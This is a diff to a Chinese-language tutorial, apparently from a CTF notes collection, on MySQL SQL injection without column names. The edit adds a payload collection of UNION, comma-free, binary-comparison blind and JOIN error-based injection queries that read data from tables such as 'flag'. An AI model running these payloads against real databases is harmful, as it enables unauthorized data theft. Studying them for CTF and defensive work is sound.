@@ -1,6 +1,26 @@
-> 本文作者@zww
+> 本文作者 [@zww](hhttp://www.wenweizeng.com/2020/03/04/NoColumnInjection-BypassInformation-schema/#more)
 
 ## 无列名注入
+
+首先给出payload合集：
+``` sql
+-- UNION注入
+select group_concat(`2`) from (select 1,2,3 union select * from newtable)c);
+## 无逗号版本
+union select group_concat(a) from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from newtable)x;
+
+-- 比较注入
+## 使用binary
+select ((select 1,(binary 'G')) > (select * from flag limit 1));
+## 使用cast
+select ((select 1,cast('G' as binary)) > (select * from flag limit 1));
+## 使用convert
+select ((select 1,convert('G', binary)) > (select * from flag limit 1));
+
+-- JOIN报错注入
+select * from (select * from newtable a join newtable b)c;
+select * from (select * from newtable a join newtable b using(id))c;
+```
 
 ### UNION注入
 
@@ -143,7 +163,7 @@ mysql> select ((select 1,'G') > (select * from flag limit 1));
 
 这是因为 **mysql默认是不区分大小写的** ，所以说实际上比较的是ascii(g)与ascii(f)，当然前者大，返回1
 
-如果我们要比较ascii码的大小，那我们就需要使用**二进制字符串**进行比较
+如果我们要比较ascii码的大小，那我们就需要使用 **二进制字符串** 进行比较
 
 具体来说，mysql可以使用三类函数进行类型的转换
 | Name | Description |
@@ -164,7 +184,7 @@ select ((select 1,cast('G' as binary)) > (select * from flag limit 1));
 select ((select 1,convert('G', binary)) > (select * from flag limit 1));
 ```
 
-或者可以使用mysql9中新增的数据类型json，因为json的string类型是大小写敏感的
+或者可以使用mysql8中新增的数据类型json，因为json的string类型是大小写敏感的
 
 ![](./img/NoColumnInjection&BypassInformation_schema/1.png)
 
